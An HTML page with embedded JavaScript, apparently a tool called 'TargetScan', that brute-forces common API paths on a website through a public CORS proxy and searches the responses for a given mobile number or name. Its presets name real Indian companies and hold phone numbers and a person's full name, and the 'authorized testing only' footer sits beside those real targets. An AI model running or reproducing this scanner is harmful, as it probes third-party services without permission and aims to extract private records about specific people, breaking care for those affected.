<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>🎯 Smart Targeted Data Leak Scanner</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e17;
            color: #eef2ff;
            min-height: 100vh;
            padding: 20px;
        }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: #0d1520; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #22c55e; }

        .container { max-width: 1300px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0 24px;
            border-bottom: 1px solid #1a2744;
            margin-bottom: 28px;
            flex-wrap: wrap;
            gap: 12px;
        }
        .brand { display: flex; align-items: center; gap: 14px; }
        .brand-icon {
            width: 44px; height: 44px;
            background: linear-gradient(135deg, #22c55e, #16a34a);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            box-shadow: 0 0 30px rgba(34,197,94,0.15);
        }
        .brand h1 { font-size: 20px; font-weight: 800; }
        .brand h1 span { color: #22c55e; }
        .brand small { display: block; font-size: 11px; color: #64748b; }

        .badge {
            padding: 6px 18px;
            background: #111827;
            border-radius: 50px;
            border: 1px solid #1e2d4a;
            font-size: 12px;
            color: #94a3b8;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .badge .dot {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: #22c55e;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.8); }
        }

        .card {
            background: #0f172a;
            border-radius: 16px;
            border: 1px solid #1a2744;
            overflow: hidden;
            margin-bottom: 24px;
        }
        .card-header {
            padding: 18px 24px;
            background: #0d1520;
            border-bottom: 1px solid #1a2744;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
        }
        .card-header h2 {
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .card-body { padding: 24px; }

        .input-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            gap: 12px;
        }
        @media (max-width: 1000px) { .input-grid { grid-template-columns: 1fr 1fr; } }
        @media (max-width: 600px) { .input-grid { grid-template-columns: 1fr; } }

        .field { position: relative; }
        .field i {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: #64748b;
        }
        .field input, .field select {
            width: 100%;
            padding: 14px 14px 14px 44px;
            background: #060b18;
            border: 2px solid #1a2744;
            border-radius: 10px;
            color: #eef2ff;
            font-size: 14px;
            font-family: 'Inter', sans-serif;
            outline: none;
            transition: all 0.3s;
        }
        .field input:focus, .field select:focus {
            border-color: #22c55e;
            box-shadow: 0 0 0 4px rgba(34,197,94,0.12);
        }
        .field select option { background: #0f172a; }

        .btn {
            padding: 14px 24px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
            justify-content: center;
            white-space: nowrap;
        }
        .btn-primary {
            background: linear-gradient(135deg, #22c55e, #16a34a);
            color: #fff;
            box-shadow: 0 4px 20px rgba(34,197,94,0.18);
        }
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(34,197,94,0.25);
        }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .btn-secondary {
            background: #1a2744;
            color: #94a3b8;
            border: 1px solid #1e2d4a;
        }
        .btn-secondary:hover { background: #1e2d4a; color: #eef2ff; }
        .btn-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
            color: #fff;
        }

        .flex-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }

        #status {
            padding: 12px 16px;
            border-radius: 10px;
            font-size: 14px;
            margin: 16px 0;
            display: none;
        }
        #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
        #status.success { background: #0d1c0d; border: 1px solid #22c55e; color: #22c55e; display: block; }
        #status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; display: block; }
        #status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; display: block; }

        .stat-box {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 10px;
            margin: 12px 0;
            display: none;
        }
        .stat-item {
            background: #0d1520;
            border: 1px solid #1a2744;
            border-radius: 8px;
            padding: 10px 14px;
            text-align: center;
        }
        .stat-item .num { font-size: 22px; font-weight: 800; }
        .stat-item .label { font-size: 11px; color: #64748b; }
        .stat-item .num.found { color: #22c55e; }
        .stat-item .num.total { color: #f59e0b; }
        .stat-item .num.matched { color: #ef4444; }

        .progress-wrap { display: none; margin: 12px 0; }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #0d1520;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #f59e0b, #22c55e);
            border-radius: 10px;
            transition: width 0.3s;
        }
        .progress-text {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #64748b;
            margin-top: 4px;
        }

        /* ─── MATCH RESULTS ─── */
        .match-results {
            display: none;
            margin-top: 16px;
        }
        .match-item {
            background: #0d1520;
            border: 1px solid #1a2744;
            border-radius: 10px;
            padding: 14px 18px;
            margin-bottom: 10px;
            border-left: 4px solid #22c55e;
        }
        .match-item .match-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        .match-item .match-method {
            font-size: 11px;
            font-weight: 700;
            padding: 2px 10px;
            border-radius: 50px;
        }
        .match-item .match-method.get { background: #0d1a2b; color: #3b82f6; border: 1px solid #3b82f6; }
        .match-item .match-method.post { background: #1c1a0d; color: #eab308; border: 1px solid #eab308; }
        .match-item .match-url {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #94a3b8;
            flex: 1;
            padding: 0 10px;
            word-break: break-all;
        }
        .match-item .match-badge {
            font-size: 11px;
            padding: 2px 12px;
            border-radius: 50px;
            background: #1c0d0d;
            color: #ef4444;
            border: 1px solid #ef4444;
        }

        .match-item .match-details {
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid #1a2744;
        }

        .match-item .match-fields {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px;
            margin-top: 8px;
        }
        @media (max-width: 600px) { .match-item .match-fields { grid-template-columns: 1fr; } }

        .match-item .field-box {
            display: flex;
            justify-content: space-between;
            padding: 6px 12px;
            background: #060b18;
            border-radius: 6px;
            border: 1px solid #0d1520;
        }
        .match-item .field-box .label { color: #64748b; font-size: 12px; }
        .match-item .field-box .value { color: #22c55e; font-weight: 600; font-size: 13px; }

        .match-item .response-box {
            background: #060b18;
            border-radius: 6px;
            padding: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: #94a3b8;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #0d1520;
            margin-top: 8px;
        }
        .match-item .response-box .highlight {
            background: #1c0d0d;
            color: #ef4444;
            padding: 1px 4px;
            border-radius: 3px;
            border: 1px solid #ef4444;
        }

        .log-area {
            background: #060b18;
            border-radius: 10px;
            border: 1px solid #1a2744;
            padding: 16px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #94a3b8;
            white-space: pre-wrap;
            word-break: break-all;
            margin-top: 16px;
            display: none;
        }
        .log-area .success { color: #22c55e; }
        .log-area .error { color: #ef4444; }
        .log-area .info { color: #3b82f6; }
        .log-area .warning { color: #eab308; }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #1a2744;
            border-top-color: #22c55e;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .footer {
            margin-top: 28px;
            padding: 16px 0;
            border-top: 1px solid #1a2744;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
            font-size: 12px;
            color: #475569;
        }
        .footer .warn { color: #ef4444; }

        .preset-buttons {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 12px;
        }
        .preset-buttons button {
            padding: 6px 16px;
            background: #0d1520;
            border: 1px solid #1a2744;
            border-radius: 50px;
            color: #94a3b8;
            font-size: 12px;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.2s;
        }
        .preset-buttons button:hover {
            border-color: #22c55e;
            color: #eef2ff;
        }

        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            padding: 12px 24px;
            background: #0f172a;
            border: 1px solid #22c55e;
            border-radius: 10px;
            color: #22c55e;
            font-weight: 500;
            font-size: 14px;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.4s;
            pointer-events: none;
        }
        .toast.show { opacity: 1; transform: translateY(0); }

        .no-match {
            text-align: center;
            padding: 30px;
            color: #64748b;
        }
        .no-match i { font-size: 48px; display: block; margin-bottom: 12px; color: #1a2744; }
        .no-match h3 { color: #94a3b8; font-weight: 400; }
    </style>
</head>
<body>

<div class="container">

    <!-- ─── HEADER ─── -->
    <div class="header">
        <div class="brand">
            <div class="brand-icon"><i class="fas fa-bullseye"></i></div>
            <div>
                <h1>Target<span>Scan</span></h1>
                <small>Exact Match Data Leak Finder</small>
            </div>
        </div>
        <div class="badge">
            <span class="dot"></span>
            <span>Smart Matching</span>
        </div>
    </div>

    <!-- ─── MAIN CARD ─── -->
    <div class="card">
        <div class="card-header">
            <h2><i class="fas fa-search" style="color:#22c55e;"></i> Enter Website + Target Data</h2>
            <span style="color:#64748b;font-size:12px;">Scans ALL APIs and shows only matching results</span>
        </div>
        <div class="card-body">

            <!-- ─── INPUT GRID ─── -->
            <div class="input-grid">
                <div class="field">
                    <i class="fas fa-globe"></i>
                    <input type="text" id="targetUrl" placeholder="Website URL" value="https://paynearby.in" />
                </div>
                <div class="field">
                    <i class="fas fa-hashtag"></i>
                    <input type="text" id="testParam" placeholder="Parameter (e.g. mobile)" value="mobile" />
                </div>
                <div class="field">
                    <i class="fas fa-phone"></i>
                    <input type="text" id="searchMobile" placeholder="Mobile Number to find" value="8809559017" />
                </div>
                <div class="field">
                    <i class="fas fa-user"></i>
                    <input type="text" id="searchName" placeholder="Name to find (optional)" value="" />
                </div>
            </div>

            <div class="preset-buttons">
                <span style="color:#64748b;font-size:12px;margin-right:6px;">Presets:</span>
                <button onclick="setPreset('paynearby')">PayNearby</button>
                <button onclick="setPreset('mgl')">MGL</button>
                <button onclick="setPreset('mobile')">Mobile Only</button>
            </div>

            <div class="flex-row">
                <button class="btn btn-primary" id="scanBtn" style="flex:1;">
                    <i class="fas fa-radar"></i> Find Data Leaks
                </button>
                <button class="btn btn-secondary" onclick="clearAll()">
                    <i class="fas fa-times"></i> Clear
                </button>
            </div>

            <div id="status"></div>

            <div class="progress-wrap" id="progressWrap">
                <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
                <div class="progress-text">
                    <span id="progressLabel">0 / 0</span>
                    <span id="progressPercent">0%</span>
                </div>
            </div>

            <div class="stat-box" id="statBox">
                <div class="stat-item"><div class="num total" id="statTotal">0</div><div class="label">Total APIs</div></div>
                <div class="stat-item"><div class="num found" id="statFound">0</div><div class="label">Data Leaks</div></div>
                <div class="stat-item"><div class="num matched" id="statMatched">0</div><div class="label">Matches Found</div></div>
            </div>

            <div class="match-results" id="matchResults"></div>
            <div class="log-area" id="logArea"></div>

        </div>
    </div>

    <div class="footer">
        <span><span class="warn">⚠️</span> Shows only APIs where your search data matches</span>
        <span>For authorized security testing only</span>
    </div>
</div>

<div class="toast" id="toast">✅ Copied!</div>

<script>
    // ─── DOM ───
    const targetUrl = document.getElementById('targetUrl');
    const testParam = document.getElementById('testParam');
    const searchMobile = document.getElementById('searchMobile');
    const searchName = document.getElementById('searchName');
    const scanBtn = document.getElementById('scanBtn');
    const statusDiv = document.getElementById('status');
    const logArea = document.getElementById('logArea');
    const matchResults = document.getElementById('matchResults');
    const progressWrap = document.getElementById('progressWrap');
    const progressFill = document.getElementById('progressFill');
    const progressLabel = document.getElementById('progressLabel');
    const progressPercent = document.getElementById('progressPercent');
    const statBox = document.getElementById('statBox');
    const statTotal = document.getElementById('statTotal');
    const statFound = document.getElementById('statFound');
    const statMatched = document.getElementById('statMatched');

    let discoveredApis = [];
    let isRunning = false;

    // ─── PRESETS ───
    function setPreset(type) {
        if (type === 'paynearby') {
            targetUrl.value = 'https://paynearby.in';
            testParam.value = 'mobile';
            searchMobile.value = '8809559017';
            searchName.value = '';
        } else if (type === 'mgl') {
            targetUrl.value = 'https://www.mahanagargas.com';
            testParam.value = 'bpNumber';
            searchMobile.value = '7505757889';
            searchName.value = 'SHAMA PATHAK';
        } else if (type === 'mobile') {
            targetUrl.value = 'https://www.mahanagargas.com';
            testParam.value = 'mobile';
            searchMobile.value = '7505757889';
            searchName.value = '';
        }
        clearAll();
    }

    // ─── LOG ───
    function log(msg, type = 'info') {
        logArea.style.display = 'block';
        const line = document.createElement('div');
        line.className = type;
        line.textContent = msg;
        logArea.appendChild(line);
        logArea.scrollTop = logArea.scrollHeight;
    }

    function setStatus(msg, type = 'info') {
        statusDiv.className = type;
        statusDiv.innerHTML = msg;
        statusDiv.style.display = 'block';
    }

    function clearAll() {
        logArea.innerHTML = '';
        logArea.style.display = 'none';
        matchResults.innerHTML = '';
        matchResults.style.display = 'none';
        statBox.style.display = 'none';
        progressWrap.style.display = 'none';
        statusDiv.style.display = 'none';
        discoveredApis = [];
    }

    function showToast(msg) {
        const t = document.getElementById('toast');
        t.textContent = msg || '✅ Copied!';
        t.classList.add('show');
        setTimeout(() => t.classList.remove('show'), 2000);
    }

    // ─── ESCAPE ───
    function escapeHtml(str) {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    // ─── DISCOVER APIS ───
    async function discoverApis(url) {
        const apis = [];
        const paths = [
            '', '/api', '/api/v1', '/api/v2', '/api/v3',
            '/ajax', '/ajax/get', '/ajax/post', '/ajax/details',
            '/rest', '/rest/v1',
            '/get', '/post', '/details', '/info', '/data',
            '/customer', '/user', '/order', '/bill', '/payment',
            '/mobile', '/email', '/profile', '/account',
            '/service', '/services', '/product', '/products',
            '/invoice', '/usage', '/history', '/statement',
            '/view', '/show', '/fetch', '/retrieve',
            '/v1', '/v2', '/v3'
        ];
        const methods = ['GET', 'POST'];

        log(`🔍 Discovering APIs on: ${url}`, 'info');

        for (const path of paths) {
            for (const method of methods) {
                const fullUrl = url + path;
                try {
                    const proxy = 'https://corsproxy.io/?';
                    const test = 'test_' + Date.now();
                    let response;
                    if (method === 'GET') {
                        response = await fetch(proxy + encodeURIComponent(fullUrl + '?test=' + test), { signal: AbortSignal.timeout(3000) });
                    } else {
                        const fd = new URLSearchParams();
                        fd.append('test', test);
                        response = await fetch(proxy + encodeURIComponent(fullUrl), {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: fd.toString(),
                            signal: AbortSignal.timeout(3000)
                        });
                    }
                    if (response.status === 200 || response.status === 404) {
                        const text = await response.text();
                        const isJson = text.trim().startsWith('{') || text.trim().startsWith('[');
                        const hasData = text.length > 30 && (text.includes('{') || text.includes('[') || text.includes('html'));
                        if (isJson || hasData) {
                            apis.push({
                                url: fullUrl,
                                method: method,
                                status: 'pending',
                                response: text.substring(0, 500),
                                fullResponse: text
                            });
                            log(`✅ Found: ${method} ${fullUrl}`, 'success');
                        }
                    }
                } catch (e) { /* Silent */ }
            }
        }

        const unique = [];
        const seen = new Set();
        for (const api of apis) {
            const key = api.url + api.method;
            if (!seen.has(key)) { seen.add(key); unique.push(api); }
        }
        return unique;
    }

    // ─── TEST API ───
    async function testApi(api, param, value) {
        try {
            const proxy = 'https://corsproxy.io/?';
            let response;
            if (api.method === 'GET') {
                const sep = api.url.includes('?') ? '&' : '?';
                response = await fetch(proxy + encodeURIComponent(api.url + sep + param + '=' + value), {
                    signal: AbortSignal.timeout(5000)
                });
            } else {
                const fd = new URLSearchParams();
                fd.append(param, value);
                response = await fetch(proxy + encodeURIComponent(api.url), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: fd.toString(),
                    signal: AbortSignal.timeout(5000)
                });
            }
            const text = await response.text();
            return { status: response.status, response: text };
        } catch (e) {
            return { status: 0, response: `Error: ${e.message}` };
        }
    }

    // ─── CHECK MATCH ───
    function checkMatch(response, mobile, name) {
        const matches = [];
        // Check mobile
        if (mobile && response.includes(mobile)) {
            matches.push({ type: '📱 Mobile', value: mobile });
        }
        // Check name
        if (name && name.trim() && response.toLowerCase().includes(name.toLowerCase().trim())) {
            matches.push({ type: '👤 Name', value: name });
        }
        return matches;
    }

    // ─── MAIN SCAN ───
    document.getElementById('scanBtn').addEventListener('click', async function() {
        if (isRunning) return;

        const url = targetUrl.value.trim();
        const param = testParam.value.trim();
        const mobile = searchMobile.value.trim();
        const name = searchName.value.trim();

        if (!url) { setStatus('⚠️ Please enter a URL', 'warning'); return; }
        if (!param) { setStatus('⚠️ Please enter a parameter', 'warning'); return; }
        if (!mobile && !name) { setStatus('⚠️ Please enter a mobile number or name to search', 'warning'); return; }

        let cleanUrl = url;
        if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
            cleanUrl = 'https://' + cleanUrl;
        }
        if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);

        isRunning = true;
        this.disabled = true;
        this.innerHTML = `<span class="spinner"></span> Searching...`;
        clearAll();

        const searchDesc = `${mobile || ''}${mobile && name ? ' & ' : ''}${name || ''}`;
        setStatus(`⏳ Searching for "${searchDesc}" in all APIs on ${cleanUrl}...`, 'info');
        log(`🚀 Starting targeted scan on: ${cleanUrl}`, 'info');
        log(`📌 Searching for: ${searchDesc}`, 'info');

        try {
            // ─── DISCOVER ───
            discoveredApis = await discoverApis(cleanUrl);
            log(`✅ Discovered ${discoveredApis.length} APIs`, 'success');

            if (discoveredApis.length === 0) {
                setStatus('⚠️ No APIs discovered. Try a different URL.', 'warning');
                isRunning = false;
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-radar"></i> Find Data Leaks';
                return;
            }

            progressWrap.style.display = 'block';
            statBox.style.display = 'grid';
            statTotal.textContent = discoveredApis.length;

            let matchCount = 0;
            let foundLeaks = 0;
            const matchedResults = [];

            // ─── TEST EACH API ───
            for (let i = 0; i < discoveredApis.length; i++) {
                const api = discoveredApis[i];
                const result = await testApi(api, param, mobile || 'test');
                api.fullResponse = result.response;

                const matches = checkMatch(result.response, mobile, name);

                if (matches.length > 0) {
                    matchCount++;
                    foundLeaks += matches.length;
                    matchedResults.push({
                        api: api,
                        matches: matches,
                        response: result.response
                    });
                    log(`🔴 MATCH FOUND: ${api.method} ${api.url} (${matches.length} matches)`, 'error');
                } else {
                    log(`🟢 No match: ${api.method} ${api.url}`, 'success');
                }

                const pct = Math.round(((i + 1) / discoveredApis.length) * 100);
                progressFill.style.width = pct + '%';
                progressLabel.textContent = `${i + 1} / ${discoveredApis.length}`;
                progressPercent.textContent = pct + '%';

                statFound.textContent = foundLeaks;
                statMatched.textContent = matchCount;
            }

            // ─── DISPLAY MATCH RESULTS ───
            if (matchedResults.length > 0) {
                let html = '';
                matchedResults.forEach((item, idx) => {
                    const api = item.api;
                    const matches = item.matches;
                    const response = item.response;

                    html += `
                        <div class="match-item">
                            <div class="match-header">
                                <span class="match-method ${api.method.toLowerCase()}">${api.method}</span>
                                <span class="match-url">${escapeHtml(api.url)}</span>
                                <span class="match-badge">${matches.length} Match${matches.length > 1 ? 'es' : ''}</span>
                            </div>
                            <div class="match-details">
                                <div class="match-fields">
                                    ${matches.map(m => `
                                        <div class="field-box">
                                            <span class="label">${m.type}</span>
                                            <span class="value">${escapeHtml(m.value)}</span>
                                        </div>
                                    `).join('')}
                                </div>
                                <div class="response-box">${escapeHtml(response)}</div>
                            </div>
                        </div>
                    `;
                });

                matchResults.innerHTML = html;
                matchResults.style.display = 'block';

                setStatus(`🔴 ${matchCount} API${matchCount > 1 ? 's' : ''} found with matching data!`, 'error');
            } else {
                matchResults.innerHTML = `
                    <div class="no-match">
                        <i class="fas fa-search"></i>
                        <h3>No matching data found</h3>
                        <p style="color:#64748b;font-size:14px;margin-top:6px;">
                            Searched for "${searchDesc}" in ${discoveredApis.length} APIs
                        </p>
                    </div>
                `;
                matchResults.style.display = 'block';
                setStatus(`✅ No matches found for "${searchDesc}"`, 'success');
            }

            log(`🏁 Scan complete! ${matchCount} matches found.`, 'success');

        } catch (error) {
            setStatus(`❌ Error: ${error.message}`, 'error');
            log(`❌ ${error.message}`, 'error');
        } finally {
            isRunning = false;
            this.disabled = false;
            this.innerHTML = '<i class="fas fa-radar"></i> Find Data Leaks';
        }
    });
</script>
</body>
</html>
